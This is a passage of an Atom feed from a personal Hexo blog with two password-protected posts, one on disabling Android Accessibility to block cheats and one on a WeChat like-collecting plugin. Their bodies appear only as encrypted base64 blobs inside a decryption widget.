<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-25T04:19:52.577Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一些基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-25T04:19:52.577Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>微信集赞插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-23T08:09:20.819Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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